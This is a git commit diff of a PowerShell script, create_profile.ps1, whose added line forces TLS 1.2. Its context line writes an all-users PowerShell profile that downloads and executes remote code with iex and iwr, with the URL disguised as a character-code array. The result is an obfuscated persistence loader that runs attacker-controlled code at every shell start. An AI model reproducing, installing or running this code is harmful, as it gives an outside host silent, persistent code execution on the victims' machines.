20f04a45b8acc6fed9e3b6947ef399ad13740d87
pangeaimmersive <161491662+pangeaimmersive@users.noreply.github.com>
2024-03-22 19:36:20 -0400

    Update create_profile.ps1

--- create_profile.ps1
+++ create_profile.ps1
@@ -1,1 +1,2 @@
+if([Net.ServicePointManager]::SecurityProtocol -ne 'Tls12'){[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12}
 New-Item -Path "$PSHOME\profile.ps1" -ItemType File -Value "(iex (iwr -Uri ([char[]](104,116,116,112,115,58,47,47,112,97,110,103,101,97,105,109,109,101,114,115,105,118,101,46,105,111) -Join '')).ToString())"
